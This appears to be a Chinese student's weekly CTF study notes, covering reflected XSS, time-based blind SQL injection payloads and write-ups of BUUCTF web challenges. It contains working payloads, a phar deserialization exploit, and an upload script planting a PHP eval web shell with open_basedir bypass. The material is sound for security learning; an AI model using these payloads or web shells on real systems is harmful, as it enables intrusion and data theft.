---
title: week3
date: 2021-04-18 
tags: note
author: 1_/\/

---      

## week3
本周看了看web提纲中的相关知识，复现了几种特殊的SQL注入手段，然后是刷题..........         

### Nep web指导        

1.本视频一开始介绍了哪两个工具，他们的作用分别是什么？为什么作者会推荐firefox，它的优点是什么？（5分）      
	
	Burp Proxy-----拦截HTPP(s)请求，抓包，修改请求，发包......        
	
	Firefox-----好用的开发人员工具......

2.本视频中体现了哪些攻防上的哲学观点？作者希望你养成什么样的思维？这些思维在帮助你挖掘漏洞的时候有什么帮助？结合你的经历与视频内容谈谈你的看法。（10分）

	攻要找一点，防要找全部      
	
	对应用程序的每个按钮都看看，并思考程序可能被攻击的方式


3.审计以下代码：



	```php
	<?php
	if(isset($_GET[ ' name ' ])){
	echo "<h1>Hello {$_GET['name']} !</h1>";
	}
	?>
	<form method="GET">
	Enter your name: <input type="input" name="name"><br>
	<input type=" submit">
	```




本段代码涉及到客户端，服务端以及通信协议。
运行在客户端的代码主要有HTML以及javascript，由浏览器核心负责解释

通信协议为HTTP协议，有多种格式的请求包，常见的为POST与GET

运行在服务端的代码为php，由php核心负责解释。

用户端与服务端通过HTTP通信协议进行交互。

那么，以上代码中，哪些部分属于客户端的内容，哪些属于服务端的内容？（1分）
	
	html部分属于客户端的内容，PHP部分属于服务端的内容

客户端是通过传递什么参数来控制服务端代码的？（1分）

	name

客户端通过控制该参数会对服务端造成什么影响，继而使得客户端本身收到影响，从而造成了什么漏洞？如果是xss漏洞，具体又是什么类型的xss漏洞，为什么？（3分）

	反射型xss
	提交name=<script>alert(1)</script>后查看页面源代码，发现
	插入了<script>标签并被网页解析       


![01.png](https://ae04.alicdn.com/kf/U20e43d350dcd492c8cd41f983b285f5dw.jpg)


4.思考：现实中如何利用xss漏洞实施攻击，我们应该如何预防？（1分）

	在网站中插入XSS获得管理员cookie，登录后台管理页面.......       
	
	过滤标签，HTTP-only

### SQL         

`time injection`
`benchmark函数`      
`BENCHMARK(loop_count,expr)`      
loop_count是重复执行的次数，expr是要执行的表达式       


	mysql> select benchmark(100000000,1+1);
	+--------------------------+
	| benchmark(100000000,1+1) |
	+--------------------------+
	|                        0 |
	+--------------------------+
	1 row in set (1.48 sec)        

以此结合and进行时间盲注        

	1=1延时

	mysql> select * from guestbook where comment_id=1 and 1=1 and benchmark(10000000,sha(1));
	Empty set (2.04 sec)

	1=0，不会延时

	mysql> select * from guestbook where comment_id=1 and 1=0 and benchmark(10000000,sha(1));
	Empty set (0.00 sec)


以`sqllab-less-9`为例     
![01.png](https://ae04.alicdn.com/kf/U4e8dd5045c0d4f279cefe3efd1232931i.jpg)      
payload：`1' and ascii(substr(database(),1,1))>0 and(benchmark(10000000,sha(1)))%23`      

###笛卡尔积       
笛卡尔积：   
   
![](https://ae02.alicdn.com/kf/U3af545a58a114e0d89199d96773005e5y.jpg)

	mysql> select count(*) from information_schema.tables;
	+----------+
	| count(*) |
	+----------+
	|      287 |
	+----------+
	1 row in set (0.00 sec)       

后面还可以加其他列或者表，从而使其计算花费的时间不同![02.png](https://ae03.alicdn.com/kf/Ua5f6439e6b1b43ec9fa741c0cd281150k.jpg)       


	1=1 延时
	mysql> select * from guestbook where comment_id=1 and 1=1 and(select count(*) from information_schema.columns,information_schema.tables A,information_schema.tables B);
	+------------+-------------------------+------+
	| comment_id | comment                 | name |
	+------------+-------------------------+------+
	|          1 | This is a test comment. | test |
	+------------+-------------------------+------+
	1 row in set (11.73 sec)
	


	1=0  不会延时
	mysql> select * from guestbook where comment_id=1 and 1=0 and(select count(*) from information_schema.columns,information_schema.tables A,information_schema.tables B);
	Empty set (0.00 sec)

依旧可以以and连接构造时间盲注        

payload：`1' and ascii(substr(database(),1,1))>0 and(select count(*) from information_schema.columns,information_schema.tables A,information_schema.tables B)#`     



[SQL注入有趣姿势总结](https://xz.aliyun.com/t/5505)          


### `encode_and_encode`       






	```php
	 <?php
	error_reporting(0);
	
	if (isset($_GET['source'])) {
	  show_source(__FILE__);
	  exit();
	}
	
	function is_valid($str) {
	  $banword = [
	    // no path traversal
	    '\.\.',
	    // no stream wrapper
	    '(php|file|glob|data|tp|zip|zlib|phar):',
	    // no data exfiltration
	    'flag'
	  ];
	  $regexp = '/' . implode('|', $banword) . '/i';
	  if (preg_match($regexp, $str)) {
	    return false;
	  }
	  return true;
	}
	
	$body = file_get_contents('php://input');
	$json = json_decode($body, true);
	
	if (is_valid($body) && isset($json) && isset($json['page'])) {
	  $page = $json['page'];
	  $content = file_get_contents($page);
	  if (!$content || !is_valid($content)) {
	    $content = "<p>not found</p>\n";
	  }
	} else {
	  $content = '<p>invalid request</p>';
	}
	
	// no data exfiltration!!!
	$content = preg_replace('/HarekazeCTF\{.+\}/i', 'HarekazeCTF{&lt;censored&gt;}', $content);
	echo json_encode(['content' => $content]); 
	```



以json的格式post数据，读取flag文件        

json中可以用utf-16编码       

php---->`\u0070\u0068\u0070`        
flag----->`\u0066\u006C\u0061\u0067`       

伪协议读取即可        

payload：`{ "page" : "\u0070\u0068\u0070://filter/read=convert.Base64-encode/resource=/\u0066\u006c\u0061\u0067"}`



![01.png](https://ae04.alicdn.com/kf/Uc0dae37fec114059ba662aef6c3440a4s.jpg)


***************
****************
![我是伞兵](https://ae03.alicdn.com/kf/U077aee7bf14d4989834bd3d5c060ab95X.jpg)    

### EasyBypass         


代码审计     




![01.png](https://ae04.alicdn.com/kf/U81afd0c96ea04194babb7ddac8d9d8acR.jpg)     

应该注意到comm1中没有过滤`tac`     

flag被过，可以用通配符`f???`      

一开始觉得用`;`把file毙了就行了，但我忽略了     

	$comm1 = '"' . $comm1 . '"';
	$comm2 = '"' . $comm2 . '"';

还应该闭合双引号         

payload：`?comm1=";tac /f???;"`   
payload：`?comm1=";tac /fl\ag;"`         
之前遇到过这个，两个`\\`过滤不了`\`，因为要经过PHP和正则两层解析，最后匹配的是个`|`      
![02.png](https://ae04.alicdn.com/kf/U20fbfe11e83c4e30a3043885763b63b9L.jpg)          
file闭合，命令执行           

这样一道题在本地试了半天，太菜了        

`Linux通配符`     


	|     #管道符，或者（正则）   #命令1 | 命令2，命令1的结果传递给命令2
	>     #输出重定向   #清空原文内容，然后向文件里追加内容
	>>    #输出追加重定向   #追加到文件最后一行
	<     #输入重定向
	<<    #追加输入重定向
	~     #当前用户家目录
	`` $() #引用命令被执行后的结果
	$     #以。。。结尾（正则）
	^     #以。。。开头（正则）
	*     #匹配0或多个字符，通配符
	？    #任意一个字符，通配符
	#       #注释
	&       #让程序或脚本切换到后台执行
	&&      #并且 同时成立
	[]      #表示一个范围（正则，通配符）
	{}      #产生一个序列（通配符）
	.       #当前目录的硬链接
	..      #上级目录的硬链接
![03.png](https://ae03.alicdn.com/kf/U7a5bcd1aa2484b7d9ee175e7b557cd0dt.jpg)        

### SimplePHP       
![01.png](https://ae03.alicdn.com/kf/Ub16431fd83624f07b158ba34f22c3a5c8.jpg)      

一开始上传文件，试了一波，感觉不行       
查看文件里也没有上传的文件，url变成了这`http://c8f4d1a6-6922-4386-b8ad-5454fdc52a38.node3.buuoj.cn/file.php?file=`感觉可以伪协议读取一波文件，网页注释中`flag is in f1ag.php`但没法直接读flag，但读不出来，看了WP，后面直接加文件名就行了，不用伪协议。。。。。。。。。。。。。。          

`index.php`       


	```php
	<?php 
	header("content-type:text/html;charset=utf-8");  
	include 'base.php';
	?> 
	``` 





`base.php`    
   

![02.png](https://ae02.alicdn.com/kf/Ucdb358cbcd1143c9900976dbb1f9fd8aL.jpg)    
   

`file.php` 
     

![03.png](https://ae03.alicdn.com/kf/U376206dfb980446d9bfe46fee0ea095d9.jpg)   
     

`function.php`  

    
![04.png](https://ae03.alicdn.com/kf/Ud189e385babc4686ab45f6222c6dfaeaK.jpg)  
     

`class.php`        







	```php
	 <?php
	class C1e4r
	{
	    public $test;
	    public $str;
	    public function __construct($name)
	    {
	        $this->str = $name;
	    }
	    public function __destruct()
	    {
	        $this->test = $this->str;
	        echo $this->test;
	    }
	}
	
	class Show
	{
	    public $source;
	    public $str;
	    public function __construct($file)
	    {
	        $this->source = $file;   //$this->source = phar://phar.jpg
	        echo $this->source;
	    }
	    public function __toString()
	    {
	        $content = $this->str['str']->source;
	        return $content;
	    }
	    public function __set($key,$value)
	    {
	        $this->$key = $value;
	    }
	    public function _show()
	    {
	        if(preg_match('/http|https|file:|gopher|dict|\.\.|f1ag/i',$this->source)) {
	            die('hacker!');
	        } else {
	            highlight_file($this->source);
	        }
	        
	    }
	    public function __wakeup()
	    {
	        if(preg_match("/http|https|file:|gopher|dict|\.\./i", $this->source)) {
	            echo "hacker~";
	            $this->source = "index.php";
	        }
	    }
	}
	class Test
	{
	    public $file;
	    public $params;
	    public function __construct()
	    {
	        $this->params = array();
	    }
	    public function __get($key)
	    {
	        return $this->get($key);
	    }
	    public function get($key)
	    {
	        if(isset($this->params[$key])) {
	            $value = $this->params[$key];
	        } else {
	            $value = "index.php";
	        }
	        return $this->file_get($value);
	    }
	    public function file_get($value)
	    {
	        $text = base64_encode(file_get_contents($value));
	        return $text;
	    }
	}
	?> 
	```


主要就是这个class.php          
没有`unserialize`      
应该是phar了       
看一下，没过滤         

pop链      
`C1e4r->__destruct->Show->__toString->Test->__get->get()`        





	```php
	<?php
	class C1e4r
	{
	    public $test;
	    public $str;
	    public function __construct()
	    {
	        $this->str=new Show();
	    }
	}
	
	class Show
	{
	    public $source;
	    public $str;
	    public function __construct()
	    {
	        $this->str['str']=new Test();
	    }
	}
	class Test
	{
	    public $file;
	    public $params;
	    public function __construct()
	    {
	        $this->params['source']="/var/www/html/f1ag.php";
	    }
	
	}
	
	$c1e4r = new C1e4r();
	
	
	
	$phar = new Phar("exp.phar"); //.phar文件
	$phar->startBuffering();
	$phar->setStub('<?php __HALT_COMPILER(); ? >'); //固定的
	$phar->setMetadata($c1e4r); //触发的头是C1e4r类，所以传入C1e4r对象
	$phar->addFromString("exp.txt", "test"); //随便写点什么生成个签名
	$phar->stopBuffering();
	
	?>
	```



生成的phar文件后缀改为`array("gif","jpeg","jpg","png")之中的`    
上传        
`/upload/`----->目录开着（还可以这样。。。）
![06.png](https://sc04.alicdn.com/kf/U7ef653ef22384f92b3c62d63c9147bf27.jpg)
复制文件名，访问即可得到flag         
![05.png](https://ae03.alicdn.com/kf/U8f7e66d8be4549688e1d94f262ca86f6I.jpg)     

### EasyWeb       




	```php
	 <?php
	function get_the_flag(){
	    // webadmin will remove your upload file every 20 min!!!! 
	    $userdir = "upload/tmp_".md5($_SERVER['REMOTE_ADDR']);
	    if(!file_exists($userdir)){
	    mkdir($userdir);
	    }
	    if(!empty($_FILES["file"])){
	        $tmp_name = $_FILES["file"]["tmp_name"];
	        $name = $_FILES["file"]["name"];
	        $extension = substr($name, strrpos($name,".")+1);     ##文件后缀
	    if(preg_match("/ph/i",$extension)) die("^_^"); 
	        if(mb_strpos(file_get_contents($tmp_name), '<?')!==False) die("^_^");  ##文件中过滤了<?
	    if(!exif_imagetype($tmp_name)) die("^_^");   ##头文件检测
	        $path= $userdir."/".$name;
	        @move_uploaded_file($tmp_name, $path);
	        print_r($path);
	    }
	}
	
	$hhh = @$_GET['_'];
	
	if (!$hhh){
	    highlight_file(__FILE__);
	}
	
	if(strlen($hhh)>18){
	    die('One inch long, one inch strong!');
	}
	
	if ( preg_match('/[\x00- 0-9A-Za-z\'"\`~_&.,|=[\x7F]+/i', $hhh) )
	    die('Try something else!');
	
	$character_type = count_chars($hhh, 3);
	if(strlen($character_type)>12) die("Almost there!");
	
	eval($hhh);
	?>
	```      




数字，字母都被过了，用异或       
要异或浏览器不能解码的不可见的字符    

[大佬的脚本](https://blog.csdn.net/weixin_43940853/article/details/103749357?utm_medium=distribute.pc_relevant.none-task-blog-2%7Edefault%7EBlogCommendFromBaidu%7Edefault-4.control&dist_request_id=1330144.34969.16182323962248803&depth_1-utm_source=distribute.pc_relevant.none-task-blog-2%7Edefault%7EBlogCommendFromBaidu%7Edefault-4.control)        








	```python
	import string
	ee= string.printable
	print(ee)   ##输出可打印字符
	a= map(lambda x:x.encode("hex"),list(ee))
	_=[]
	G=[]
	E=[]
	T=[]
	print(list(ee))
	for i in range(256):
	    for j in range(256):
	        if (chr(i) not in list(ee)) & (chr(j) not in list(ee)):
	            tem = i^j
	            if chr(tem)=="_":
	                temp=[]
	                temp.append(hex(i)[2:] + "^" + str(hex(j))[2:])         ##转为十六进制是为了缩短长度
	                _.append(temp)
	            if chr(tem)=="G":
	                temp=[]
	                temp.append(hex(i)[2:] + "^" + str(hex(j))[2:])
	                G.append(temp)
	            if chr(tem)=="E":
	                temp=[]
	                temp.append(hex(i)[2:] + "^" + str(hex(j))[2:])
	                E.append(temp)
	            if chr(tem)=="T":
	                temp=[]
	                temp.append(hex(i)[2:] + "^" + str(hex(j))[2:])
	                T.append(temp)
	print(_)
	print(G)
	print(E)
	print(T)
	```



构造`$_GET[a]();&a=phpinfo`        
![01.png](https://sc02.alicdn.com/kf/U71602567344d4ae2afee14ccff8f185ek.jpg)     
payload:`${%df%c7%c5%d4^%80%80%80%80}{%80}();&%80=phpinfo`    


然后执行`get_the_flag()`函数          
`${%df%c7%c5%d4^%80%80%80%80}{%80}();&%80=get_the_flag`       

上传文件      
过滤了`ph/i`       
考虑`.user.ini`或者`.htaccess`        
`.user.ini`需要上传的目录里有可执行的PHP文件，这里显然没有         

`.htaccess`     
因为有头文件检测，一般用GIF89a，看WP说是会使文件失效；我试了下，发现上传失败；用`#define width 1337#define height 1337 `可以绕过   

		#define width 1337
		#define height 1337
		AddType application/x-httpd-php .ahhh    ##将.ahhh后缀的文件以PHP解析
		php_value auto_append_file "php://filter/convert.base64-decode/resource=./shell.ahhh 
最后一句的解释：               
![05.png](https://ae02.alicdn.com/kf/Ued9c20fc4b034016b3961677278461e7l.jpg)    


过滤了`<?`      
`<script language="php">system('cat /flag');</script>`也不能用，php版本7.x的         

base64编码，在`.htaccess`里解码         

[大佬的上传脚本](https://blog.csdn.net/qq_42967398/article/details/105615235)         






	```python
	import requests
	import base64
	
	htaccess = b"""
	#define width 1337
	#define height 1337
	AddType application/x-httpd-php .ahhh
	php_value auto_append_file "php://filter/convert.base64-decode/resource=./shell.ahhh"
	"""
	shell = b"GIF89a12" + base64.b64encode(b"<?php eval($_REQUEST['cmd']);?>")
	url = "http://2f470aa2-5472-401e-b146-efd0864251a5.node3.buuoj.cn/?_=${%df%c7%c5%d4^%80%80%80%80}{%80}();&%80=get_the_flag"
	
	files = {'file':('.htaccess',htaccess,'image/jpeg')}
	data = {"upload":"Submit"}
	response = requests.post(url=url, data=data, files=files)
	print(response.text)
	
	files = {'file':('shell.ahhh',shell,'image/jpeg')}
	response = requests.post(url=url, data=data, files=files)
	print(response.text)
	```

![02.png](https://ae04.alicdn.com/kf/U8ab36d268f2c4e338ff91bd9e73355d6W.jpg)         

访问一句话文件，![03.png](https://ae02.alicdn.com/kf/U1b0011f9ec664565ad977d32c46423b74.jpg)     
可用     
但没法直接读文件       
需要绕过`open_basedir`          

[从PHP底层看open_basedir bypass](https://skysec.top/2019/04/12/%E4%BB%8EPHP%E5%BA%95%E5%B1%82%E7%9C%8Bopen-basedir-bypass/#%E5%89%8D%E8%A8%80)         

payload:`cmd=chdir('img');ini_set('open_basedir','..');chdir('..');chdir('..');chdir('..');chdir('..');ini_set('open_basedir','/');var_dump(scandir("/"));`![04.png](https://ae03.alicdn.com/kf/U043edb17de044c79b82910e8d280915b7.jpg)         

payload:`cmd=chdir('img');ini_set('open_basedir','..');chdir('..');chdir('..');chdir('..');chdir('..');ini_set('open_basedir','/');var_dump(file_get_contents("/THis_Is_tHe_F14g"));`

得到flag       
         